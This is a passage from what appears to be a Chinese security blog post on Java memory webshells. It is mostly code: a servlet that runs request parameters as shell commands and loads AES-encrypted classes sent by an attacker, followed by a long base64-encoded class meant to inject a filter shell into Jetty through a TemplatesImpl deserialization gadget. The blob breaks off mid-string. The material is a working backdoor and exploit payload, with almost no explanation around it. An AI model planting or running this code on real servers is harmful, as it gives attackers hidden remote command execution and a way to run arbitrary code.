<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTemplates</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Dynamic Servlet says hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;type&quot;</span>) != <span class="literal">null</span> &amp;&amp; request.getParameter(<span class="string">&quot;type&quot;</span>).equals(<span class="string">&quot;basic&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">//basic cmd shell</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(Config.getPassword());</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty())&#123;</span><br><span class="line">                String[] cmds = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span>(File.separator.equals(<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/C&quot;</span>, cmd&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();</span><br><span class="line">                response.getWriter().println(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(request.getHeader(Config.getHeader()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//behind3 shell</span></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">k</span> <span class="operator">=</span> Config.getBehinderShellPwdPwd();</span><br><span class="line">                    request.getSession().setAttribute(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">                    <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">                    cipher.init(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>((request.getSession().getAttribute(<span class="string">&quot;u&quot;</span>) + <span class="string">&quot;&quot;</span>).getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">                    <span class="type">byte</span>[] evilClassBytes = cipher.doFinal(<span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(evilClassBytes);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">evilObject</span> <span class="operator">=</span> evilClass.newInstance();</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">targetMethod</span> <span class="operator">=</span> evilClass.getDeclaredMethod(<span class="string">&quot;equals&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ServletRequest.class, ServletResponse.class&#125;);</span><br><span class="line">                    targetMethod.invoke(evilObject, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;request, response&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">        U(ClassLoader c)&#123;<span class="built_in">super</span>(c);&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span> []b)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>感觉还是不太难。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADQBEgoAKACkCgClAKYKAFIApwoAqACpCgCoAKoJAEAAqwoACgCsCgAMAK0HAK4HAK8IALAHALEHAFAJALIAswoADAC0CgCLALUIALYKAEAAtwcAuAoAsgC5CgCLALoIAGMKAEAAuwgAZAgAvAkAQAC9CgAJAL4HAL8IAMAHAMEKABMAwgoADADDCADECgAMAMUKAMYAtQoAxgDHCABtCgAMAMgIAG4HAMkJAEAAyggAywgAcQgAcgkAQADMCAB0CgAeAM0JAM4AzwgA0AoA0QDSCgAMANMHANQKAH0AtQoAfQDVBwDWCgA3ANcKAEIA2AoAQADZCgBAANoKAEAA2wgAZggA3AgA3QcA3goAQADYBwDfAQAOc2VydmxldEhhbmRsZXIBABJMamF2YS9sYW5nL09iamVjdDsBAApmaWx0ZXJOYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAPZmlsdGVyQ2xhc3NOYW1lAQADdXJsAQANQkFTRTY0RGVjb2RlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEZGF0YQEACmlucHV0Qnl0ZXMBAAJbQgEAB2VuY29kZXIHAOABAAdEZWNvZGVyAQAMSW5uZXJDbGFzc2VzAQAaTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBAAxlbmNvZGVkQnl0ZXMBAApMb2FkRmlsdGVyAQADKClWAQABYQEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABYgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlAQAKRXhjZXB0aW9ucwEADUdldFdlYkNvbnRlbnQBAA1jdXJyZW50VGhyZWFkAQASTGphdmEvbGFuZy9UaHJlYWQ7AQASY29udGV4dENsYXNzTG9hZGVyAQAIX2NvbnRleHQBAAxJbmplY3RGaWx0ZXIBAAdIRmlsdGVyAQAYTGpha2FydGEvc2VydmxldC9GaWx0ZXI7AQASZmlsdGVyUGF0aE1hcHBpbmdzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAMY29uc3RydWN0b3IyAQAfTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEADGZpbHRlckhvbGRlcgEACXNldEZpbHRlcgEAB3NldE5hbWUBAAtjb25zdHJ1Y3RvcgEADWZpbHRlck1hcHBpbmcBAA1zZXRGaWx0ZXJOYW1lAQAPc2V0RmlsdGVySG9sZGVyAQAJcGF0aFNwZWNzAQALc2V0UGF0aFNwZWMBAAhHZXRGaWVsZAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQABZgEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAJlMQEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQABbwEAAWsHAOEBAAlHZXRNZXRob2QBAFIoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAEdmFyNgEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEAA29iagEACm1ldGhvZE5hbWUBAApwYXJhbUNsYXp6AQASW0xqYXZhL2xhbmcvQ2xhc3M7AQAGbWV0aG9kAQAFY2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBABVbTGphdmEvbGFuZy9DbGFzczwqPjsHAOIBAAlTaWduYXR1cmUBAFUoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M8Kj47KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAGPGluaXQ+AQAEdGhpcwEAKUxjb20vYm9vZ2lwb3AvbWVtc2hlbGwvSW5qZWN0SmV0dHlGaWx0ZXI7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcA4wEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEAFkluamVjdEpldHR5RmlsdGVyLmphdmEMAOQA5QcA5gwA5wDoDADpAOoHAOsMAGEA7AwA7QDuDABHAEYMAO8A8AwA8QDyAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzBwDzDAD0AIgMAPUA9gwA9wD4ARhUeXY2NnZnQUFBRElCR3dvQVF3QjdDUUI4QUgwSUFINEtBSDhBZ0FnQWdRc0FRQUNDQ0FDRENnQU5BSVFLQUlVQWhnb0FEUUNIQ1FDSUFJa0lBSW9IQUlzSUFJd0lBSTBJQUY4SUFJNEhBSThLQUpBQWtRb0FrQUNTQ2dDVEFKUUtBQklBbFFnQWxnb0FFZ0NYQ2dBU0FKZ0xBRUVBbVFvQW1nQ0FCd0NiQ2dDRkFKd0xBQndBblFzQUhBQ2VDQUNmQ2dDRkFLQUxBQndBb1FnQW9nc0Fvd0NrQ0FDbENnQ21BS2NIQUtnSEFLa0tBQ2dBZXdzQW93Q3FDZ0FvQUtzSUFLd0tBQ2dBclFvQUtBQ3VDZ0FOQUs4S0FDY0FzQW9BcGdDeEJ3Q3lDZ0F5QUhzTEFFQUFzd29BdEFDMUNnQXlBTFlLQUtZQXR3Y0F1QW9BUXdDNUNnQS9BTG9LQURnQXV3b0FPQUM4Q2dBL0FMMElBTDRIQUw4SEFNQUhBTUVLQUQ4QXdnY0F3d29BeEFERkJ3REdDZ0JGQU1jTEFNZ0F5UWNBeWdjQXl3RUFBVlVCQUF4SmJtNWxja05zWVhOelpYTUJBQVk4YVc1cGRENEJBQU1vS1ZZQkFBUkRiMlJsQVFBUFRHbHVaVTUxYldKbGNsUmhZbXhsQVFBU1RHOWpZV3hXWVhKcFlXSnNaVlJoWW14bEFRQUVkR2hwY3dFQUpreGpiMjB2WW05dloybHdiM0F2YldWdGMyaGxiR3d2Um1sc2RHVnlWR1Z0Y0d4aGRHVTdBUUFFYVc1cGRBRUFIeWhNYW1GMllYZ3ZjMlZ5ZG14bGRDOUdhV3gwWlhKRGIyNW1hV2M3S1ZZQkFBeG1hV3gwWlhKRGIyNW1hV2NCQUJ4TWFtRjJZWGd2YzJWeWRteGxkQzlHYVd4MFpYSkRiMjVtYVdjN0FRQUtSWGhqWlhCMGFXOXVjd2NBekFFQUNHUnZSbWxzZEdWeUFRQmJLRXhxWVhaaGVDOXpaWEoyYkdWMEwxTmxjblpzWlhSU1pYRjFaWE4wTzB4cVlYWmhlQzl6WlhKMmJHVjBMMU5sY25ac1pYUlNaWE53YjI1elpUdE1hbUYyWVhndmMyVnlkbXhsZEM5R2FXeDBaWEpEYUdGcGJqc3BWZ0VBQkdOdFpITUJBQk5iVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3QVFBR2NtVnpkV3gwQVFBU1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQURZMjFrQVFBQmF3RUFCbU5wY0dobGNnRUFGVXhxWVhaaGVDOWpjbmx3ZEc4dlEybHdhR1Z5T3dFQURtVjJhV3hEYkdGemMwSjVkR1Z6QVFBQ1cwSUJBQWxsZG1sc1EyeGhjM01CQUJGTWFtRjJZUzlzWVc1bkwwTnNZWE56T3dFQUNtVjJhV3hQWW1wbFkzUUJBQkpNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNCQUF4MFlYSm5aWFJOWlhSb2IyUUJBQnBNYW1GMllTOXNZVzVuTDNKbFpteGxZM1F2VFdWMGFHOWtPd0VBQVdVQkFCVk1hbUYyWVM5c1lXNW5MMFY0WTJWd2RHbHZianNCQUE1elpYSjJiR1YwVW1WeGRXVnpkQUVBSGt4cVlYWmhlQzl6WlhKMmJHVjBMMU5sY25ac1pYUlNaWEYxWlhOME93RUFEM05sY25ac1pYUlNaWE53YjI1elpRRUFIMHhxWVhaaGVDOXpaWEoyYkdWMEwxTmxjblpzWlhSU1pYTndiMjV6WlRzQkFBdG1hV3gwWlhKRGFHRnBiZ0VBRzB4cVlYWmhlQzl6WlhKMmJHVjBMMFpwYkhSbGNrTm9ZV2x1T3dFQURWTjBZV05yVFdGd1ZHRmliR1VIQUlzSEFGd0hBTVlIQU0wQkFBZGtaWE4wY205NUFRQUtVMjkxY21ObFJtbHNaUUVBRTBacGJIUmxjbFJsYlhCc1lYUmxMbXBoZG1FTUFFd0FUUWNBemd3QXp3RFFBUUFkV3l0ZElFUjVibUZ0YVdNZ1JtbHNkR1Z5SUhOaGVYTWdhR1ZzYkc4SEFORU1BTklBMHdFQUJIUjVjR1VNQU5RQTFRRUFCV0poYzJsakRBQytBTllIQU5jTUFOZ0EyUXdBMmdEYkJ3RGNEQURkQUY0QkFBRXZBUUFRYW1GMllTOXNZVzVuTDFOMGNtbHVad0VBQnk5aWFXNHZjMmdCQUFJdFl3RUFBaTlEQVFBUmFtRjJZUzkxZEdsc0wxTmpZVzV1WlhJSEFONE1BTjhBNEF3QTRRRGlCd0RqREFEa0FPVU1BRXdBNWdFQUFseEJEQURuQU9nTUFPa0EyUXdBNmdEckJ3RHNBUUFsYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnhkV1Z6ZEF3QTdRRFpEQUR0QU5VTUFPNEEyUUVBQkZCUFUxUU1BTzhBMlF3QThBRHhBUUFCZFFjQThnd0E4d0QwQVFBRFFVVlRCd0QxREFEMkFQY0JBQjlxWVhaaGVDOWpjbmx3ZEc4dmMzQmxZeTlUWldOeVpYUkxaWGxUY0dWakFRQVhhbUYyWVM5c1lXNW5MMU4wY21sdVowSjFhV3hrWlhJTUFQZ0ErUXdBK2dEN0FRQUFEQUQ2QVB3TUFQMEEyUXdBL2dEL0RBQk1BUUFNQUZNQkFRRUFGbk4xYmk5dGFYTmpMMEpCVTBVMk5FUmxZMjlrWlhJTUFRSUJBd2NCQkF3QkJRRFpEQUVHQVFjTUFRZ0JDUUVBSm1OdmJTOWliMjluYVhCdmNDOXRaVzF6YUdWc2JDOUdhV3gwWlhKVVpXMXdiR0YwWlNSVkRBRUtBUXNNQVF3QkRRd0FUQUVPREFFUEFSQU1BUkVCRWdFQUJtVnhkV0ZzY3dFQUQycGhkbUV2YkdGdVp5OURiR0Z6Y3dFQUhHcGhkbUY0TDNObGNuWnNaWFF2VTJWeWRteGxkRkpsY1hWbGMzUUJBQjFxWVhaaGVDOXpaWEoyYkdWMEwxTmxjblpzWlhSU1pYTndiMjV6WlF3QkV3RVVBUUFRYW1GMllTOXNZVzVuTDA5aWFtVmpkQWNCRlF3QkZnRVhBUUFUYW1GMllTOXNZVzVuTDBWNFkyVndkR2x2Ymd3QkdBQk5Cd0VaREFCWkFSb0JBQ1JqYjIwdlltOXZaMmx3YjNBdmJXVnRjMmhsYkd3dlJtbHNkR1Z5VkdWdGNHeGhkR1VCQUJScVlYWmhlQzl6WlhKMmJHVjBMMFpwYkhSbGNnRUFIbXBoZG1GNEwzTmxjblpzWlhRdlUyVnlkbXhsZEVWNFkyVndkR2x2YmdFQUUycGhkbUV2YVc4dlNVOUZlR05sY0hScGIyNEJBQkJxWVhaaEwyeGhibWN2VTNsemRHVnRBUUFEYjNWMEFRQVZUR3BoZG1FdmFXOHZVSEpwYm5SVGRISmxZVzA3QVFBVGFtRjJZUzlwYnk5UWNtbHVkRk4wY21WaGJRRUFCM0J5YVc1MGJHNEJBQlVvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1ZZQkFBeG5aWFJRWVhKaGJXVjBaWElCQUNZb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFGU2hNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNwV2dFQUhHTnZiUzlpYjI5bmFYQnZjQzl0WlcxemFHVnNiQzlEYjI1bWFXY0JBQXRuWlhSUVlYTnpkMjl5WkFFQUZDZ3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFIYVhORmJYQjBlUUVBQXlncFdnRUFER3BoZG1FdmFXOHZSbWxzWlFFQUNYTmxjR0Z5WVhSdmNnRUFFV3BoZG1FdmJHRnVaeTlTZFc1MGFXMWxBUUFLWjJWMFVuVnVkR2x0WlFFQUZTZ3BUR3BoZG1FdmJHRnVaeTlTZFc1MGFXMWxPd0VBQkdWNFpXTUJBQ2dvVzB4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsTWFtRjJZUzlzWVc1bkwxQnliMk5sYzNNN0FRQVJhbUYyWVM5c1lXNW5MMUJ5YjJObGMzTUJBQTVuWlhSSmJuQjFkRk4wY21WaGJRRUFGeWdwVEdwaGRtRXZhVzh2U1c1d2RYUlRkSEpsWVcwN0FRQVlLRXhxWVhaaEwybHZMMGx1Y0hWMFUzUnlaV0Z0T3lsV0FRQU1kWE5sUkdWc2FXMXBkR1Z5QVFBbktFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bE1hbUYyWVM5MWRHbHNMMU5qWVc1dVpYSTdBUUFFYm1WNGRBRUFDV2RsZEZkeWFYUmxjZ0VBRnlncFRHcGhkbUV2YVc4dlVISnBiblJYY21sMFpYSTdBUUFUYW1GMllTOXBieTlRY21sdWRGZHlhWFJsY2dFQUNXZGxkRWhsWVdSbGNnRUFDV2RsZEUxbGRHaHZaQUVBRm1kbGRFSmxhR2x1WkdWeVUyaGxiR3hRZDJSUWQyUUJBQXBuWlhSVFpYTnphVzl1QVFBaUtDbE1hbUYyWVhndmMyVnlkbXhsZEM5b2RIUndMMGgwZEhCVFpYTnphVzl1T3dFQUhtcGhkbUY0TDNObGNuWnNaWFF2YUhSMGNDOUlkSFJ3VTJWemMybHZiZ0VBREhObGRFRjBkSEpwWW5WMFpRRUFKeWhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenRNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNwVmdFQUUycGhkbUY0TDJOeWVYQjBieTlEYVhCb1pYSUJBQXRuWlhSSmJuTjBZVzVqWlFFQUtTaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1GNEwyTnllWEIwYnk5RGFYQm9aWEk3QVFBTVoyVjBRWFIwY21saWRYUmxBUUFtS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsTWFtRjJZUzlzWVc1bkwwOWlhbVZqZERzQkFBWmhjSEJsYm1RQkFDMG9UR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdLVXhxWVhaaEwyeGhibWN2VTNSeWFXNW5RblZwYkdSbGNqc0JBQzBvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuUW5WcGJHUmxjanNCQUFoMGIxTjBjbWx1WndFQUNHZGxkRUo1ZEdWekFRQUVLQ2xiUWdFQUZ5aGJRa3hxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxXQVFBWEtFbE1hbUYyWVM5elpXTjFjbWwwZVM5TFpYazdLVllCQUFsblpYUlNaV0ZrWlhJQkFCb29LVXhxWVhaaEwybHZMMEoxWm1abGNtVmtVbVZoWkdWeU93RUFGbXBoZG1FdmFXOHZRblZtWm1WeVpXUlNaV0ZrWlhJQkFBaHlaV0ZrVEdsdVpRRUFER1JsWTI5a1pVSjFabVpsY2dFQUZpaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BXMElCQUFka2IwWnBibUZzQVFBR0tGdENLVnRDQVFBSVoyVjBRMnhoYzNNQkFCTW9LVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFPWjJWMFEyeGhjM05NYjJGa1pYSUJBQmtvS1V4cVlYWmhMMnhoYm1jdlEyeGhjM05NYjJGa1pYSTdBUUJBS0V4amIyMHZZbTl2WjJsd2IzQXZiV1Z0YzJobGJHd3ZSbWxzZEdWeVZHVnRjR3hoZEdVN1RHcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjanNwVmdFQUFXY0JBQlVvVzBJcFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQkFBdHVaWGRKYm5OMFlXNWpaUUVBRkNncFRHcGhkbUV2YkdGdVp5OVBZbXBsWTNRN0FRQVJaMlYwUkdWamJHRnlaV1JOWlhSb2IyUUJBRUFvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3VzB4cVlYWmhMMnhoYm1jdlEyeGhjM003S1V4cVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5TlpYUm9iMlE3QVFBWWFtRjJZUzlzWVc1bkwzSmxabXhsWTNRdlRXVjBhRzlrQVFBR2FXNTJiMnRsQVFBNUtFeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME8xdE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc3BUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdBUUFQY0hKcGJuUlRkR0ZqYTFSeVlXTmxBUUFaYW1GMllYZ3ZjMlZ5ZG14bGRDOUdhV3gwWlhKRGFHRnBiZ0VBUUNoTWFtRjJZWGd2YzJWeWRteGxkQzlUWlhKMmJHVjBVbVZ4ZFdWemREdE1hbUYyWVhndmMyVnlkbXhsZEM5VFpYSjJiR1YwVW1WemNHOXVjMlU3S1ZZQUlRQklBRU1BQVFCSkFBQUFCQUFCQUV3QVRRQUJBRTRBQUFBdkFBRUFBUUFBQUFVcXR3QUJzUUFBQUFJQVR3QUFBQVlBQVFBQUFBd0FVQUFBQUF3QUFRQUFBQVVBVVFCU0FBQUFBUUJUQUZRQUFnQk9BQUFBTlFBQUFBSUFBQUFCc1FBQUFBSUFUd0FBQUFZQUFRQUFBQkFBVUFBQUFCWUFBZ0FBQUFFQVVRQlNBQUFBQUFBQkFGVUFWZ0FCQUZjQUFBQUVBQUVBV0FBQkFGa0FXZ0FDQUU0QUFBTEZBQWNBQ2dBQUFZcXlBQUlTQTdZQUJDc1NCYmtBQmdJQXhnQ1FLeElGdVFBR0FnQVNCN1lBQ0prQWdDdTRBQW01QUFZQ0FEb0VHUVRHQUcwWkJMWUFDcG9BWlFFNkJiSUFDeElNdGdBSW1RQWJCcjBBRFZrREVnNVRXUVFTRDFOWkJSa0VVem9GcHdBWUJyMEFEVmtERWhCVFdRUVNFVk5aQlJrRVV6b0Z1d0FTV2JnQUV4a0Z0Z0FVdGdBVnR3QVdFaGUyQUJpMkFCazZCaXk1QUJvQkFCa0d0Z0FicHdEc0s4QUFITGdBSGJrQUhnSUF4Z0RWSzhBQUhMa0FId0VBRWlDMkFBaVpBTGU0QUNFNkJDdkFBQnk1QUNJQkFCSWpHUVM1QUNRREFCSWx1QUFtT2dVWkJRVzdBQ2RadXdBb1diY0FLU3ZBQUJ5NUFDSUJBQklqdVFBcUFnQzJBQ3NTTExZQUxiWUFMcllBTHhJbHR3QXd0Z0F4R1FXN0FESlp0d0F6SzdrQU5BRUF0Z0ExdGdBMnRnQTNPZ2E3QURoWktpcTJBRG0yQURxM0FEc1pCcllBUERvSEdRZTJBRDA2Q0JrSEVqNEZ2UUEvV1FNU1FGTlpCQkpCVTdZQVFqb0pHUWtaQ0FXOUFFTlpBeXRUV1FRc1U3WUFSRmVuQUJVNkJCa0V0Z0JHcHdBTExTc3N1UUJIQXdDeEFBRUFyd0YwQVhjQVJRQURBRThBQUFCdUFCc0FBQUFVQUFnQUZnQWpBQmdBTGdBWkFEc0FHZ0ErQUJzQVNRQWNBR0VBSGdCMkFDQUFrZ0FoQUowQUl3Q3ZBQ1lBd0FBbkFNVUFLQURYQUNrQTNnQXFBUklBS3dFc0FDd0JRZ0F0QVVrQUxnRmdBQzhCZEFBekFYY0FNUUY1QURJQmZnQXpBWUVBTlFHSkFEY0FVQUFBQUk0QURnQStBRjhBV3dCY0FBVUFrZ0FMQUYwQVhnQUdBQzRBYndCZkFGNEFCQURGQUs4QVlBQmVBQVFBM2dDV0FHRUFZZ0FGQVN3QVNBQmpBR1FBQmdGQ0FESUFaUUJtQUFjQlNRQXJBR2NBYUFBSUFXQUFGQ